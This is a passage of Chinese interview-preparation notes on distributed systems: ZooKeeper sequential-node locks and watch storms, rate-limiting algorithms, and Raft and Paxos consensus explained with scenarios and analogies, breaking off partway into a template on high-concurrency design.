<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lock/lock_<span class="number">00000001</span>  （客户端<span class="keyword">A</span>创建） ``/lock/lock_<span class="number">00000002</span>  （客户端B创建） ``/lock/lock_<span class="number">00000003</span>  （客户端C创建）</span><br></pre></td></tr></table></figure>
<p>ZooKeeper 自动编号，<strong>保证顺序且唯一</strong>。</p>
<h4 id="2、每个客户端获取-lock-下所有节点，找出自己是否是最小的。">2、每个客户端获取 <code>/lock</code> 下所有节点，找出自己是否是最小的。</h4>
<ul>
<li>谁是编号最小的那个（如 A），就获得锁。</li>
<li>如果不是，就监听<strong>比自己小的那个节点的删除事件</strong>。</li>
</ul>
<p>比如：</p>
<ul>
<li>B监听 A（lock_00000001）</li>
<li>C监听 B（lock_00000002）</li>
</ul>
<h4 id="3、客户端-A-执行业务逻辑（拥有锁）">3、客户端 A 执行业务逻辑（拥有锁）</h4>
<h4 id="4、客户端-A-执行完后，断开连接-删除节点">4、客户端 A 执行完后，<strong>断开连接 / 删除节点</strong></h4>
<ul>
<li><code>lock_00000001</code> 被删除</li>
<li>ZooKeeper 通知 B：“你监听的节点被删除了”</li>
</ul>
<h4 id="5、客户端-B-收到通知后，判断自己是否是最小节点-→-获取锁">5、客户端 B 收到通知后，判断自己是否是最小节点 → 获取锁</h4>
<ul>
<li>然后开始执行</li>
<li>执行完后也释放锁，唤醒 C</li>
</ul>
<p>✅ 实现了<strong>自动排队 + 自动唤醒 + 断开自动释放锁</strong></p>
<h2 id="✅-面试时你可以这样总结：">✅ 面试时你可以这样总结：</h2>
<blockquote>
<p>我们可以通过 ZooKeeper 的 <strong>顺序临时节点 + 监听机制</strong> 实现公平、可靠的分布式锁。所有客户端在 <code>/lock</code> 下创建临时顺序节点，编号最小者获得锁，其他节点监听前一个节点。当前一个释放后，ZooKeeper 会触发 watcher 通知下一个排队者，从而形成有序队列式锁控制，具备自动释放、断线容错、通知机制，是一种强一致的分布式锁方案。</p>
</blockquote>
<p>zookerper 实现的分布式锁是强一致性的，因为它底层的 ZAB协议(原子广播协议), 天然满足 CP，但是这也意味着性能的下降, 所以不站在具体数据下看 Redis 和 Zookeeper, 代表着性能（Redis）和一致性（Zookeeper）的取舍</p>
<blockquote>
<p>Redis 和 ZooKeeper 分别代表了分布式锁在性能和一致性上的两种取舍。Redis 锁更适合低延迟高吞吐的场景，但存在锁失效或漂移的可能。而 ZooKeeper 基于 ZAB 协议实现强一致性，适合金融、账务等关键系统，但牺牲了部分性能。因此具体选择要看业务的实际需求。</p>
</blockquote>
<h2 id="监听风暴">监听风暴</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGE2Zjc4ZTMyZGQ4MWVjMzI5ZmViYjQ2OTBmMTA1NTZfdGlzYndyR0xQRklsZGw3VHpZSHpReFk0NlJMOTUxc0VfVG9rZW46U0ZFQWJWbGRPb0lrNG14T0ppTGNrM1BRbjVmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>“<strong>监听风暴（Watch Storm）</strong>”是分布式系统中（尤其是使用 <strong>ZooKeeper</strong>）常见的一种 <strong>性能问题</strong>，它指的是：</p>
<blockquote>
<p><strong>某个节点被大量客户端设置了监听器（watcher），当这个节点状态发生变化时，会导致瞬间触发大量客户端的通知，形成请求风暴。</strong></p>
</blockquote>
<h2 id="🔥-举个经典的例子：">🔥 举个经典的例子：</h2>
<p>假设有 1000 个客户端都监听了 ZooKeeper 上的某个节点 <code>/config</code>。</p>
<p>当这个节点发生变化（比如被删除或数据被修改）时，ZooKeeper 会：</p>
<ul>
<li>同时向这 1000 个客户端推送通知；</li>
<li>每个客户端又可能在收到通知后发起新的查询请求（比如重新注册监听）；</li>
<li>结果：瞬间服务压力剧增，网络风暴、ZooKeeper 卡顿，甚至崩溃。</li>
</ul>
<p>这就叫 <strong>监听风暴</strong>（watch storm）。</p>
<h2 id="📌-为什么会出现监听风暴？">📌 为什么会出现监听风暴？</h2>
<ul>
<li>ZooKeeper 的 <strong>watch 是一次性触发</strong>的，触发后就失效；</li>
<li>所以客户端在收到事件后<strong>往往会重新注册监听</strong>；</li>
<li>一旦监听者数量多、事件频繁，就容易形成大量重复的 watch 注册和通知，产生风暴。</li>
</ul>
<h2 id="✅-如何避免监听风暴？">✅ 如何避免监听风暴？</h2>
<ol>
<li><strong>避免多个客户端监听同一个关键节点</strong>
<ol>
<li>比如不要都去 watch <code>/config</code>，而是细化到 <code>/config/client1</code>、<code>/config/client2</code>。</li>
</ol>
</li>
<li><strong>合理设计 watch 的粒度与层级</strong>
<ol>
<li>多层级结构中可以只 watch 上层目录的变化，避免高频节点监听。</li>
</ol>
</li>
<li><strong>加缓存 + 延迟更新</strong>
<ol>
<li>比如用 Redis 缓存 ZooKeeper 数据，客户端监听 Redis 而非直接监听 ZooKeeper。</li>
</ol>
</li>
<li><strong>设置客户端监听阈值</strong>
<ol>
<li>一定数量以上拒绝监听或限流处理。</li>
</ol>
</li>
<li><strong>异步处理通知逻辑</strong>
<ol>
<li>减少通知后客户端的阻塞行为，避免同步操作引发连锁反应。</li>
</ol>
</li>
</ol>
<h2 id="🎯-面试总结一句话：">🎯 面试总结一句话：</h2>
<blockquote>
<p>“监听风暴是由于大量客户端同时监听 ZooKeeper 同一节点引起的通知风暴，常见于分布式配置中心、服务注册等场景。为避免它，需要对 watch 进行分层管理、限流保护，并结合缓存机制进行优化。”</p>
</blockquote>
<h2 id="顺序一致性与强一致性">顺序一致性与强一致性</h2>
<blockquote>
<p><strong>Zookeeper 实现的分布式锁，在“加锁/解锁”这个事务层面表现为强一致性，而 Zookeeper 本身提供的是顺序一致性（全序广播），是实现强一致的基础。</strong></p>
</blockquote>
<h2 id="🔍-拆解概念理解：">🔍 拆解概念理解：</h2>
<h3 id="🧠-1-Zookeeper-的一致性模型是「顺序一致性」：">🧠 1. Zookeeper 的一致性模型是「顺序一致性」：</h3>
<ul>
<li>也叫 <strong>全序一致性（Total Order）</strong>；</li>
<li>保证所有事务在所有副本上执行的顺序一致；</li>
<li>不要求副本状态是完全实时同步的（不是线性一致性）；</li>
<li>由其底层的 <strong>ZAB 协议</strong> 实现 —— 所有操作先广播给 Leader，再按顺序广播到各 Follower。</li>
</ul>
<p>🔎 举例：</p>
<blockquote>
<p>如果 ClientA 在 Node1 写了一个值，ClientB 紧接着读，在极端情况下可能还读不到最新值（延迟同步），但最终所有副本顺序一致。</p>
</blockquote>
<h3 id="🔐-2-为什么说-ZK-分布式锁是“强一致的”？">🔐 2. 为什么说 ZK 分布式锁是“强一致的”？</h3>
<p>因为：</p>
<ul>
<li>锁是靠 <strong>创建临时顺序节点 + 比较最小编号节点</strong> 的方式加锁；</li>
<li>这个过程依赖的是 ZK 的顺序一致性保障；</li>
<li>所以虽然 ZK 本身“不是线性一致”，<strong>但它能确保同一时刻只有一个客户端获取到锁</strong>；</li>
<li>也就是说：<strong>锁语义上实现的是强一致性（互斥性）</strong>。</li>
</ul>
<p>🔎 举例：</p>
<blockquote>
<p>多个客户端同时来抢锁，只会有一个客户端成功拿到锁，剩下的按顺序排队监听。</p>
</blockquote>
<p>“虽然 Zookeeper 提供的是顺序一致性，但利用其顺序节点特性和 ZAB 广播机制，实现的分布式锁是严格互斥的，语义上等价于强一致性锁，非常适合对一致性要求高的场景。”</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2U3MjkzY2E3NGFjNTg5MjI5YTQwYmFmODNiMjYyNGFfTUNXT0hzc1BkclJwNURSZ2tuZjlqRWo4eDc5N1FDUXdfVG9rZW46WUoxa2J5dVNYb1hmbXB4a2JIU2NUdGtWbkNmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>分布式常用限流算法</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTVhNDMzZTIyMDU5MjQ1MzdjOWM5YzhhYmQ1MmMwYzBfR1VIN1pPVHV3MDdhdndjRmJkS1g5RW1NRHlqV280emhfVG9rZW46UHhMQWJ6bFBwb0hKbUF4Y1lEcGMxVnBsblhlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="①-固定窗口限流（Fixed-Window）">① 固定窗口限流（Fixed Window）</h2>
<p><strong>原理：</strong></p>
<ul>
<li>将时间划分为固定区间（比如每秒），每个窗口允许处理 N 个请求；</li>
<li>在一个时间窗口内计数，超过则拒绝请求；</li>
<li>到下一个窗口时计数清零，重新开始。</li>
</ul>
<p><strong>举例：</strong></p>
<blockquote>
<p>允许每秒最多10个请求，当前是 12:00:01 到 12:00:02 这一秒内收到的第11个请求将被拒绝。</p>
</blockquote>
<p><strong>优点：</strong> 实现简单 <strong>缺点：</strong> <strong>临界时刻可能突发流量</strong>（一个窗口末尾 + 下个窗口开始瞬间）会造成 <strong>2N 流量打进来</strong></p>
<h2 id="②-滑动窗口限流（Sliding-Window）">② 滑动窗口限流（Sliding Window）</h2>
<p><strong>原理：</strong></p>
<ul>
<li>把时间窗口细分成多个小格（比如 1 秒分成 10 个 100ms 的格）；</li>
<li>每次请求时统计过去 N 秒内所有小格的请求数总和，判断是否超过阈值；</li>
<li>窗口会“滑动”更新，不固定开始时间。</li>
</ul>
<p><strong>举例：</strong></p>
<blockquote>
<p>最近 1 秒钟内，统计 [T-1000ms ~ T] 所有请求，如果超过 100，就拒绝。</p>
</blockquote>
<p><strong>优点：</strong> 平滑限制流量，<strong>避免突刺现象</strong> <strong>缺点：</strong> 实现稍复杂，需要存储每个小窗口的计数</p>
<h2 id="③-漏桶算法（Leaky-Bucket）">③ 漏桶算法（Leaky Bucket）</h2>
<p><strong>原理：</strong></p>
<ul>
<li>把请求放进一个“桶”里；</li>
<li>桶按照固定速率“漏水”处理请求；</li>
<li>如果桶满了，<strong>多余请求直接丢弃或排队</strong></li>
</ul>
<p><strong>举例：</strong></p>
<blockquote>
<p>桶容量是 100，每秒只能处理 10 个请求；突发 50 个请求进来，桶会慢慢处理，超出容量的会被丢弃。</p>
</blockquote>
<p><strong>优点：</strong> 控制流量输出速率平稳，不会突发 <strong>缺点：</strong> 对突发请求处理不友好，容易丢请求</p>
<h2 id="④-令牌桶算法（Token-Bucket）">④ 令牌桶算法（Token Bucket）</h2>
<p><strong>原理：</strong></p>
<ul>
<li>系统以固定速率生成令牌放入桶中；</li>
<li>每个请求要先获取一个令牌，才允许通过；</li>
<li>桶满时令牌会丢弃；</li>
<li><strong>可以处理突发流量</strong>，因为桶可能预先积累了令牌。</li>
</ul>
<p><strong>举例：</strong></p>
<blockquote>
<p>每秒生成 10 个令牌，桶最大容量 100；如果积累了 50 个令牌，突然来 40 个请求也能瞬间通过。</p>
</blockquote>
<p><strong>优点：</strong> <strong>可以平滑 + 应对突发请求</strong>，兼顾性能与弹性 <strong>缺点：</strong> 实现稍复杂，需定时生成令牌、处理桶状态</p>
<h3 id="固定窗口限流的缺点">固定窗口限流的缺点</h3>
<blockquote>
<p><strong>窗口大小：1秒，限流值：100</strong> 在第一个窗口的最后 999ms 突然来了 100 个请求，窗口刚好还没结束，于是这 100 个请求都通过了。 紧接着下一个窗口一开始（第1ms）又来了 100 个请求，新的窗口开始计数，又都能通过。 所以在 2ms 内通过了 200 个请求，但我们其实设置的是每秒最多 100 个。</p>
</blockquote>
<h2 id="✅-通俗解释（打比方）">✅ 通俗解释（打比方）</h2>
<p>把限流算法想象成“景区限流”：</p>
<h3 id="固定窗口限流的逻辑是：">固定窗口限流的逻辑是：</h3>
<blockquote>
<p>每秒只允许 100 个人进入景区，到了下一秒重新开始计数。</p>
</blockquote>
<p>但问题来了：</p>
<ul>
<li>你规定的是：<strong>每秒 100 人</strong>；</li>
<li>但因为是“整秒重置”的，你可能会遇到下面的突刺情况：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDdiODNhNDU1M2JiNTQwYmFhZmJmNGRiYTQ0ZjU1MGZfd0thdzJLTDNTdTFYYWJrMnJUaTdBYm82c0VzdEdMOWZfVG9rZW46WlVyWWJrR2owb21WSlN4dFBYSGNoS1NublJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-用滑动窗口的解决方案（解决固定窗口限流的突刺问题）">✅ 用滑动窗口的解决方案（解决固定窗口限流的突刺问题）</h2>
<p>滑动窗口就是：</p>
<ul>
<li>不是“整秒整秒”那种死板的限流；</li>
<li>而是<strong>每来一次请求就看过去 1 秒钟内的请求总数</strong>；</li>
<li>如果过去 1 秒内已经有 100 个了，新的请求就拒绝。</li>
</ul>
<h3 id="🔄-举例：">🔄 举例：</h3>
<ul>
<li>当前是 1.000 秒，请求来了；</li>
<li>你就回头统计 0.000 ~ 1.000 秒这一段的请求数；</li>
<li>发现过去 1 秒已经有 100 个了，那现在这个请求就不让过。</li>
</ul>
<p>这样可以实现更精确地“每秒最多 100 个”，不会出现突刺！</p>
<h1>Raft协议</h1>
<h2 id="🧪-场景设定（5-个节点）">🧪 场景设定（5 个节点）</h2>
<p>我们有一个分布式系统，由 <strong>5 个节点（S1~S5）组成</strong>。系统刚刚启动，所有节点角色都是 Follower。</p>
<h2 id="⏱️-1-选举阶段（Leader-Election）">⏱️ 1. 选举阶段（Leader Election）</h2>
<h3 id="🔹触发选举">🔹触发选举</h3>
<ul>
<li>各节点刚启动，如果一段时间内（比如 150~300ms）没收到 Leader 的心跳（AppendEntries RPC），就会<strong>自认为 Leader 失联</strong>；</li>
<li>比如 S1 超时最早，就发起选举，转为 Candidate，向其他节点发送 RequestVote 请求。</li>
</ul>
<h3 id="🔹投票规则">🔹投票规则</h3>
<ul>
<li>每个节点只能对一个 Candidate 投一次票（每个 term 只能投一次）；</li>
<li>节点会判断候选人的日志是否比自己新（更长 or 更后 term）；</li>
<li>如果 S1 的日志比较新，S2、S3 都投了票；</li>
<li>一旦 S1 获得<strong>多数节点（3/5）支持</strong>，它就成为 Leader，广播心跳信号，保持领导地位。</li>
</ul>
<p>✅ 此时：</p>
<ul>
<li>S1 = Leader</li>
<li>S2~S5 = Follower</li>
</ul>
<h2 id="📝-2-客户端发请求（日志写入）">📝 2. 客户端发请求（日志写入）</h2>
<h3 id="🔹客户端请求">🔹客户端请求</h3>
<p>客户端向 Leader（S1）发出一个写请求，例如：“新增一条订单记录：order123”。</p>
<h3 id="🔹日志追加（Append）">🔹日志追加（Append）</h3>
<p>S1 会把这个请求封装成一个日志条目：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">term:</span> <span class="number">1</span>, <span class="params">index:</span> <span class="number">1</span>, <span class="params">command:</span> <span class="string">&quot;INSERT order123&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后它：</p>
<ul>
<li>自己先把这个条目写入本地日志；</li>
<li>发送 <strong>AppendEntries RPC</strong> 给所有 Follower（S2~S5）；</li>
<li>Follower 收到后，也在自己的日志中追加这条记录，但此时都处于“未提交”状态。</li>
</ul>
<h2 id="✅-3-日志复制与提交">✅ 3. 日志复制与提交</h2>
<h3 id="🔹确认复制">🔹确认复制</h3>
<ul>
<li>一旦 Leader（S1）发现，<strong>超过半数节点</strong>都返回“日志追加成功”响应（比如 S2、S3、S4 都返回成功）；</li>
<li>Leader 就会<strong>提交日志条目</strong>，并通知 Follower 提交。</li>
</ul>
<h3 id="🔹应用到状态机">🔹应用到状态机</h3>
<ul>
<li>提交后，Leader 自己把日志应用到状态机中（比如真正写入数据库）；</li>
<li>然后它会通过下一次心跳告诉 Follower：“我已经提交了第 1 条日志”；</li>
<li>Follower 收到后，也同步把日志提交到状态机。</li>
</ul>
<p>✅ 此时：</p>
<p>所有节点状态一致，日志为：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">index:</span> <span class="number">1</span>, <span class="params">term:</span> <span class="number">1</span>, <span class="params">command:</span> <span class="string">&quot;INSERT order123&quot;</span>（已提交）</span><br></pre></td></tr></table></figure>
<h2 id="🔁-4-心跳维持">🔁 4. 心跳维持</h2>
<p>Leader 会定期向所有 Follower 发送空的 AppendEntries RPC（心跳）：</p>
<ul>
<li>维持自己的 Leader 身份；</li>
<li>顺带带上已提交的日志 index，告诉大家进度；</li>
<li>如果有新日志就一起带上；</li>
</ul>
<p>如果某个节点宕机（比如 S3），也没关系，只要<strong>大多数节点正常</strong>，系统就能继续服务。</p>
<h2 id="⚠️-5-故障切换（比如-Leader-宕机）">⚠️ 5. 故障切换（比如 Leader 宕机）</h2>
<p>假如 S1 宕机了：</p>
<ul>
<li>Follower 会在超时后自动重新发起选举；</li>
<li>比如 S2 首先超时，转为 Candidate，发起新一轮选举（Term +1）；</li>
<li>获得多数投票（比如 S3、S4），成为新的 Leader；</li>
<li>日志落后也会被补齐（Leader 会校对 follower 的日志）；</li>
<li>客户端继续向新 Leader 发请求，服务不中断。</li>
</ul>
<blockquote>
<p>Raft 通过 Leader 统一接收请求 + 多数派写入再提交 + 日志同步 + 心跳维持，实现了强一致性分布式状态机复制</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTg5MWNjMGE1Zjk4YjMxNGE1OGIyMmQ3ZTJkM2IzNWFfWGlXMkI5V01qbjRaSkNVUzVkeHVjWGZDc1NoS1hVZmNfVG9rZW46QkhyVWIzbVJrb2lWYVN4MklpbGN1RUpjbmNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="Raft-是强一致性的协议">Raft 是强一致性的协议</h2>
<blockquote>
<p>只要数据一旦被提交，所有节点最终都将达成一致，并且所有客户端都只能读到一致的数据。</p>
</blockquote>
<h3 id="💡-Raft-的强一致性语义是这样定义的：">💡 Raft 的<strong>强一致性语义</strong>是这样定义的：</h3>
<blockquote>
<p>一旦某条日志被提交（committed），系统就保证：</p>
<ul>
<li><strong>所有节点最终都会拥有这条日志</strong>；</li>
<li><strong>所有客户端在读这条数据时，一定看到的是一致的内容</strong>（即不会读到未提交或错误的数据）。</li>
</ul>
</blockquote>
<h3 id="✅-注意：Raft-不要求所有节点始终同步">✅ 注意：Raft <strong>不要求所有节点始终同步</strong></h3>
<ul>
<li>临时的网络分区或同步延迟是允许的；</li>
<li><strong>但对外行为（如客户端读写）必须是强一致的</strong>；</li>
</ul>
<h3 id="🌟-场景：">🌟 场景：</h3>
<ul>
<li>集群 5 个节点：A（Leader），B、C、D、E（Follower）</li>
<li>客户端向 Leader A 写入了 <code>&quot;set x=1&quot;</code> 的请求，A 写入自己的日志，复制给 B、C</li>
<li>此时：<code>A、B、C</code> 有这条日志，<code>D、E</code> 没收到（网络分区）</li>
<li>因为有 3/5 节点写入，满足多数派，A 提交日志并 apply 执行</li>
</ul>
<h3 id="❗这时候你问：">❗这时候你问：</h3>
<ul>
<li>D、E 还没收到日志，跟 A、B、C 数据不一样啊？</li>
</ul>
<h3 id="✅-是的，但：">✅ 是的，但：</h3>
<ul>
<li><strong>D、E 不会把这个日志应用到状态机中（因为没 commit）</strong>；</li>
<li><strong>D、E 也不会对外提供这条数据的读取服务（通常只读 Leader）</strong>；</li>
<li>所以，对客户端是透明的，一致性没有被破坏。</li>
<li>在 <strong>Leader 补发日志前</strong>，确实 D、E 节点的数据和其他节点不一致， <strong>但这只是临时性的不一致，不会对外暴露，也不会违反强一致性</strong></li>
</ul>
<h2 id="🔁-后续恢复过程：">🔁 后续恢复过程：</h2>
<p>当 D、E 恢复联通后：</p>
<ul>
<li>Leader A 会带上当前日志索引和任期，调用 <code>AppendEntries</code>；</li>
<li>发现 D、E 日志落后，就补发缺失的日志；</li>
<li>补齐后再发送 commitIndex，让它们执行 apply；</li>
<li>此时所有节点达成最终一致性。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGRmMGFkNjkwYTU2MDkxZjU2ZTkxMjA4ZjlmNTlmYjlfM1hWRmpNQmh6UEdtVFJCNFBHNm1HcVF3NkMzTUF4VExfVG9rZW46QURHNWJTZzV5bzdmVGF4ODVQR2M1WXVYblVoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="❓1-Leader-写入后，A、B、C-会不会提供读取服务？">❓1. Leader 写入后，<strong>A、B、C 会不会提供读取服务？</strong></h2>
<blockquote>
<p>✅ <strong>不会</strong>。</p>
</blockquote>
<p>在标准 Raft 实现中：</p>
<blockquote>
<p><strong>只有 Leader 才允许对外提供写服务，也“通常”只允许它对外提供读服务。</strong></p>
</blockquote>
<h2 id="✅-为什么-读也推荐只从-Leader？">✅ 为什么 <strong>读也推荐只从 Leader</strong>？</h2>
<p>这是为了保证强一致性：</p>
<ul>
<li>即使 B、C 日志跟 Leader A 一样，<strong>Raft 也默认不能让 Follower 对外直接读</strong>；</li>
<li>因为：
<ul>
<li>B、C 可能<strong>还没收到 commit 通知</strong>，日志虽然写入了，但未应用；</li>
<li>此时如果它们暴露数据，可能导致<strong>读到未提交的数据</strong>；</li>
<li>就违背了强一致性！</li>
</ul>
</li>
</ul>
<h2 id="🧠-所以常见-Raft-的读流程是这样的：">🧠 所以常见 Raft 的读流程是这样的：</h2>
<h3 id="💡-Read-from-Leader：">💡 Read from Leader：</h3>
<ul>
<li>客户端请求读数据；</li>
<li>Leader 先确认自己的 commitIndex 是最新的；</li>
<li>再从状态机中读取数据返回客户端；</li>
<li>保证读到的一定是<strong>多数派确认过的、已提交数据</strong> ✅</li>
</ul>
<h2 id="❓那-Followers-有什么用？">❓那 Followers 有什么用？</h2>
<p>虽然不提供写、不推荐读，但 Follower 是 <strong>Raft 架构中不可缺的基石</strong>：</p>
<h3 id="🧱-Follower-的作用：">🧱 Follower 的作用：</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MmFkYTEzMmY2YmQ5MmFlY2RhMmNkMTE3NTk2MjA0NGJfZWJDUVowWlkwZ1FTOGZzSHNncm9oVWg0U0ZrdThxT1lfVG9rZW46T2lLZ2JhbFR4b295VjR4WlF0d2M0aFlDbmlnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzQzNTEzZWZmZWQ3MjA2MTRmMDlhMzczMDFjYzk1NzFfZ0h2YmxqQU1OelhJV2h1ZTRyYWZJTkkxMEcwTG9oQTFfVG9rZW46RkNmZWJUNkFXb0NIbGR4SkJoaGN2ZGZCbnpmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>Paxos协议</h1>
<h2 id="🧪-编程场景下的-Paxos-流程举例">🧪 编程场景下的 Paxos 流程举例</h2>
<h3 id="场景设定：">场景设定：</h3>
<p>你有 3 个 Acceptor 节点（A1, A2, A3），系统要对一个值 “X=100” 达成一致。</p>
<h3 id="💡-1-Proposer-发起准备请求（Prepare-阶段）：">💡 1. Proposer 发起准备请求（Prepare 阶段）：</h3>
<ul>
<li>Proposer1 选择一个提案编号：<code>ProposalID = 10</code></li>
<li>向 A1、A2、A3 发送 <code>Prepare(10)</code> 消息</li>
</ul>
<p><strong>接下来是 Acceptor 的反应：</strong></p>
<ul>
<li>A1、A2、A3 从未收到过提案，所以都回复：Promise（承诺不再接受编号小于 10 的提案），并附带 “目前没有其他值”</li>
</ul>
<h3 id="💡-2-Proposer-发起正式提议（Accept-阶段）：">💡 2. Proposer 发起正式提议（Accept 阶段）：</h3>
<ul>
<li>收到多数（A1、A2）的 Promise 回复后，Proposer1 发出正式提案：<code>Accept(10, X=100)</code>；</li>
<li>向 A1、A2、A3 发出提议值为 100 的请求。</li>
</ul>
<p><strong>Acceptor 的反应：</strong></p>
<ul>
<li>A1、A2 看到编号符合要求（≥10），于是接受了值 100；</li>
<li>A3 网络延迟没有回应。</li>
</ul>
<h3 id="✅-共识达成！">✅ 共识达成！</h3>
<ul>
<li>由于 A1 和 A2 已接受了提议（2/3 多数通过），Paxos 算法认为：值 “100” 共识已达成。</li>
<li>接受者把共识结果通知 Learner；</li>
<li>Learner 得知值为 “100”，此时系统即可对外读取这个一致的值。</li>
</ul>
<h2 id="🛒-生活类比场景：“三人投票决定去哪吃饭”">🛒 生活类比场景：<strong>“三人投票决定去哪吃饭”</strong></h2>
<p>你和朋友 A、B、C 一起出去玩，要决定今晚吃什么。</p>
<h3 id="🧑-你-Proposer：你提出一个想法">🧑 你 = Proposer：你提出一个想法</h3>
<p>你先说：“我们去吃火锅吧”，这是你提出的值（value = 火锅）。</p>
<p>你担心别人突然改主意，于是你先说：“我提案编号是 #10，我们一人一票，不能听编号小的决定。”</p>
<h3 id="👩-A-和-👨-B-Acceptor：他们答应不接受更小编号的方案">👩 A 和 👨 B = Acceptor：他们答应不接受更小编号的方案</h3>
<p>你问：“你们是否承诺只接受 &gt;=10 编号的建议？”</p>
<ul>
<li>A 和 B 说：“OK！我们答应你这个提案编号 #10，之前没考虑过别的。”</li>
</ul>
<h3 id="🧑-你继续说：“那我们就定了，去吃火锅！”">🧑 你继续说：“那我们就定了，去吃火锅！”</h3>
<ul>
<li>A 和 B 回应：“好，赞成！”</li>
<li>C 正在打游戏没回复（掉线）</li>
</ul>
<p>但因为 3 个人里已经有 2 个人同意，达到“过半”，你们一致决定今晚吃火锅 ✅</p>
<p>在 Paxos 算法中，<strong>编号（Proposal Number）是用来保证提案顺序性和一致性的核心机制</strong>。你可以把它看作一个“时间戳 + 唯一 ID”的组合，用来决定哪个提案更“新”、更有优先级。</p>
<h3 id="📘-例子复现一下情景：">📘 例子复现一下情景：</h3>
<p>我们用这个生活类比：</p>
<h4 id="🏠-情景设定：大家要选今晚吃什么外卖">🏠 情景设定：大家要选今晚吃什么外卖</h4>
<p>角色如下：</p>
<ul>
<li><strong>👩 小红、👨 小明</strong>：Acceptor（接受者）</li>
<li><strong>🧑💻 小李、👨💻 小张</strong>：Proposer（提议人）</li>
</ul>
<h4 id="🥢-场景一：小李发起提案">🥢 场景一：小李发起提案</h4>
<p>小李说：“大家今晚吃 <strong>火锅吧</strong>，我的提案编号是 #10。”</p>
<p>他问小红和小明：“你们是否承诺不接受编号小于10的其他提案？”</p>
<ul>
<li>小红和小明此时还没接受过别的提案，于是都说：“OK，我同意承诺编号 &gt;=10 的提案，火锅不错。”</li>
</ul>
<h4 id="🥢-场景二：小张后来来了，也发起了提案">🥢 场景二：小张后来来了，也发起了提案</h4>
<p>小张说：“大家吃 <strong>烧烤吧</strong>，我的提案编号是 #8。”</p>
<p>这时小红和小明会说什么？</p>
<blockquote>
<p>“抱歉，你这个编号比我们已经承诺的 #10 要小，我们不能接受！”</p>
</blockquote>
<p>于是小张的提议被拒绝了！</p>
<h4 id="🧠-这个编号机制防止了什么？">🧠 这个编号机制防止了什么？</h4>
<p>它防止了“后到的老提案”把“大家都快同意的新提案”给冲掉的现象。</p>
<p>比如如果没有编号控制：</p>
<ul>
<li>小李刚让大家都同意吃火锅，小张突然来了，说吃烧烤；</li>
<li>系统如果没有编号，就可能有人重新考虑烧烤 → 共识被打断；</li>
<li>最终导致大家 <strong>吃什么也定不下来，分歧不断</strong>。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTgwNzcyZmRmN2ZmNGU0Zjk4NmQ4MzEwZWNjYzJjMzRfTEVXMW1OWlF6VG9qYXczcWNFT2d5WnE3YmY4QWtXQVBfVG9rZW46SFdMNGJ1ZHJ3bzFEZmF4cUdPQmNVNnpZbkFkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>高可用、高并发、高性能</h1>
<h2 id="三高系统设计面试话术模板（通用版）">三高系统设计面试话术模板（通用版）</h2>
<h3 id="🧩-1-高并发（High-Concurrency）">🧩 1. 高并发（High Concurrency）</h3>
<p><strong>回答模板：</strong></p>
<blockquote>
<p>在高并发场景下，我主要通过“限流、缓存、异步削峰”这三招来提升系统并发能力：</p>
<ul>
<li><strong>限流</strong>：使用如令牌桶/漏桶算法，对热点接口设置访问频率限制，防止请求打爆系统；</li>
<li><strong>缓存</strong>：引入 Redis 缓存热点数据，减少对数据库的压力，同时配合本地缓存和缓存预热；</li>
